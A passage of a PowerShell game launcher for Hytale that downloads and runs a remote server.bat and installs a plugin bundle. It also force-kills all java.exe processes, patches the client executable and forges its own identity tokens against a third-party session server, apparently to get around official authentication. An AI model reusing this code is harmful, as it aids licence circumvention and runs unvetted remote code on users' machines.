            $needsDownload = $true

            Write-Host "`n[SERVER] Checking server.bat..." -ForegroundColor Cyan
            
            if (Test-Path $serverBatDest) {
                Write-Host "      [CHECK] Found existing server.bat." -ForegroundColor Gray
                # Check Hash
                $remoteHash = Get-RemoteHash "server.bat"
                $localHash = Get-LocalSha1 $serverBatDest
                
                if ($remoteHash -and $localHash -eq $remoteHash) {
                    Write-Host "      [SKIP] File is up-to-date (Hash Match)." -ForegroundColor Green
                    $needsDownload = $false
                } else {
                    Write-Host "      [UPDATE] New version available or hash mismatch." -ForegroundColor Yellow
                }
            }

            if ($needsDownload) {
                Write-Host "      [DOWNLOAD] Fetching server.bat..." -ForegroundColor Cyan
                if (Download-WithProgress $serverBatUrl $serverBatDest) {
                    Write-Host "      [SUCCESS] Server file installed." -ForegroundColor Green
                } else {
                    Write-Host "      [ERROR] Download failed." -ForegroundColor Red
                    $serverBatDest = $null # Prevent running
                }
            }

            if ($serverBatDest -and (Test-Path $serverBatDest)) {
                Write-Host "`n[RUN] Launching Server Console..." -ForegroundColor Green
                Start-Sleep -Seconds 1
                Start-Process cmd.exe -ArgumentList "/k `"$serverBatDest`"" -WorkingDirectory $appDir
            }
            
            Write-Host "`nPress any key to return to menu..."
            [void][System.Console]::ReadKey($true)
        }
        "3" {
            $global:assetsVerified = $false
            $forceShowMenu = $true
            $proceedToLaunch = $true 
        }
        "4" {
            Write-Host "`n[HYFIXES] Downloading HyFixes Optimization Bundle..." -ForegroundColor Cyan
            $hyUrl = "https://github.com/John-Willikers/hyfixes/releases/download/v1.11.0/hyfixes-bundle-v1.11.0.zip"
            $hyZip = Join-Path $cacheDir "hyfixes.zip"
            
            if (Download-WithProgress $hyUrl $hyZip $false) {
                Write-Host "      [EXTRACT] Installing plugins..." -ForegroundColor Cyan
                
                # Extract directly to Server directory as requested
                $serverDir = Join-Path $appDir "Server"
                if (-not (Test-Path $serverDir)) { New-Item -ItemType Directory $serverDir -Force | Out-Null }
                
                if (Expand-WithProgress $hyZip $serverDir) {
                    Write-Host "      [SUCCESS] HyFixes installed to Server directory!" -ForegroundColor Green
                }
            }
            Write-Host "`nPress any key to return to menu..."
            [void][System.Console]::ReadKey($true)
        }
    }
}

# --- LAUNCH SEQUENCE ---

Write-Host "`n[4/4] Launching..." -ForegroundColor Cyan

# Kill existing
$procName = "HytaleClient"
if (Get-Process $procName -ErrorAction SilentlyContinue) {
    Write-Host "      [INFO] Hytale is already running. Closing for rerun..." -ForegroundColor Yellow
    try {
        taskkill /F /IM "${procName}.exe" /T 2>$null | Out-Null
        taskkill /F /IM "java.exe" /T 2>$null | Out-Null
        Start-Sleep -Seconds 2 
    } catch {}
}

# Ensure Java
$javaExe = Join-Path $launcherRoot "release\package\jre\latest\bin\java.exe"
if (-not (Ensure-JRE $launcherRoot $cacheDir)) {
    # If Ensure-JRE fails or isn't present, just warn
}

# Patch Client
Patch-HytaleClient $gameExe | Out-Null

# Update persistence so we don't ask to update again
$global:pwrHash = Get-LocalSha1 $gameExe
Save-Config

# --- NEW SAFETY CHECKS ---
# 1. Firewall Whitelisting (Requires Admin)
if ($isAdmin) { Assert-FirewallRule $gameExe }

# 2. Duplicate Mod Removal (Standard User OK)
Remove-DuplicateMods (Join-Path $appDir "mods")
Remove-DuplicateMods (Join-Path $appDir "earlyplugins")
# ------------------------

$dispJava = if ($global:javaPath) { $global:javaPath } else { $javaExe }
Write-Host "      Java:     $dispJava" -ForegroundColor Gray
Write-Host "      User:     $global:pName" -ForegroundColor Cyan

$launchArgs = @(
    "--app-dir", "`"$appDir`"",
    "--java-exec", "`"$dispJava`"",
    "--auth-mode", "authenticated",
    "--uuid", $global:pUuid,
    "--name", "`"$global:pName`"",
    "--identity-token", $idToken,
    "--session-token", $ssToken,
    "--user-dir", "`"$userDir`""
)

# Authenticate
if (-not $idToken) {
    $idToken = New-HytaleJWT $global:pUuid $global:pName "https://sessions.sanasol.ws"
    $ssToken = $idToken
}

if (Test-Path $gameExe) {
    $logPath = Join-Path $userDir "Logs"
    if (-not (Test-Path $logPath)) { New-Item -ItemType Directory $logPath -Force | Out-Null }
    $preLaunchLogDate = (Get-ChildItem -Path $logPath -Filter "*.log" | Sort-Object LastWriteTime -Descending | Select-Object -First 1).LastWriteTime
    if (-not $preLaunchLogDate) { $preLaunchLogDate = (Get-Date).AddMinutes(-1) }
    $reportedErrors = @()
    $global:detectedIssuerUrl = $null

    Write-Host "      [LAUNCH] Starting process..." -ForegroundColor Cyan
    
    $gameProc = Start-Process -FilePath $gameExe -ArgumentList $launchArgs `
                -WorkingDirectory (Split-Path $gameExe) `
                -WindowStyle Normal `
                -PassThru -ErrorAction SilentlyContinue

    if ($null -eq $gameProc) {
        Write-Host "------------------------------------------" -ForegroundColor Red
        Write-Host "[ERROR] Windows failed to start the process." -ForegroundColor Red
        return
    }

    Write-Host "      [CHECK] Waiting for Game Window..." -NoNewline -ForegroundColor Gray
    $stable = $false
    $guiDetected = $false
    $currentProc = $gameProc
    $maxWait = 300 

    for ($i = 0; $i -lt $maxWait; $i++) {
        Start-Sleep -Seconds 1
        $cp = Get-Process -Id $currentProc.Id -ErrorAction SilentlyContinue
        
        if (-not $cp) {
            if ($currentProc.HasExited -and $currentProc.ExitCode -eq 0) {
                Write-Host "`r      [INFO] Launcher hand-off detected. Searching..." -ForegroundColor Cyan -NoNewline
                Start-Sleep -Seconds 1
                $found = Get-Process | Where-Object { ($_.ProcessName -match "java" -or $_.ProcessName -match "Hytale") -and $_.StartTime -gt (Get-Date).AddSeconds(-15) } | Select-Object -First 1
                if ($found) {
                    $currentProc = $found
                    Write-Host "`r      [ADOPT] Now monitoring: $($found.ProcessName) (PID: $($found.Id))" -ForegroundColor Green
                    continue 
                }
            }
            Write-Host " [FAILED]" -ForegroundColor Red
            $stable = $false; break
        }
        
        $cp.Refresh()

        # Log Monitoring
        $newLogs = Get-ChildItem -Path $logPath -Filter "*.log" | Where-Object { $_.LastWriteTime -gt $preLaunchLogDate }
        foreach ($nl in $newLogs) {
            $errors = Get-Content $nl.FullName | Where-Object { $_ -match "\|ERROR\||\|FATAL\|" }
            foreach ($err in $errors) {
                if ($reportedErrors -notcontains $err) {
                    Write-Host "`r      [LOG ERROR] $($err.Trim())" -ForegroundColor Red
                    $reportedErrors += $err
                    if ($err -match "expected (https?://[^\s,]+)") {
                        $global:detectedIssuerUrl = $matches[1]
                        Write-Host "      [DETECTED] Client requires specific issuer: $global:detectedIssuerUrl" -ForegroundColor Cyan
                        Stop-Process -Id $cp.Id -Force -ErrorAction SilentlyContinue
                        $stable = $false; break
                    }
                }
            }
            if ($global:detectedIssuerUrl) { break }
        }
        if ($global:detectedIssuerUrl) { break }

        $memMB = [math]::Round($cp.WorkingSet64 / 1MB, 0)
        Write-Host "`r      [STATS] Mem: $($memMB)MB | Waiting for GUI...   " -NoNewline -ForegroundColor Gray
        
        if ($cp.MainWindowHandle -ne [IntPtr]::Zero) {
            [User32]::SetForegroundWindow($cp.MainWindowHandle) | Out-Null
            Write-Host "`r      [SUCCESS] Game Window Detected!              " -ForegroundColor Green
            $stable = $true
            $guiDetected = $true
            break
        }
    }
    Write-Host ""

    if ($global:detectedIssuerUrl) {
        Write-Host "`n[AUTO-FIX] Detected Issuer mismatch. Retrying..." -ForegroundColor Cyan
        $global:AUTH_URL_CURRENT = $global:detectedIssuerUrl
        $global:detectedIssuerUrl = $null
        Save-Config 
        Start-Sleep -Seconds 2
        continue
    }

    if ($guiDetected) {
        Write-Host "Hytale is running successfully!" -ForegroundColor Green
        Write-Host "Auto-Closing launcher in 10 seconds..." -ForegroundColor Cyan
        Start-Sleep -Seconds 10
        # Forcibly close the console window by exiting the host
        exit 0
    } elseif ($stable) {
        Write-Host "Hytale Process is stable." -ForegroundColor Green
        break
    } else {
        Write-Host "[CRIT] Process exited." -ForegroundColor Red
        if (Test-Path $logPath) { Show-LatestLogs $logPath }
        pause
    }
}
}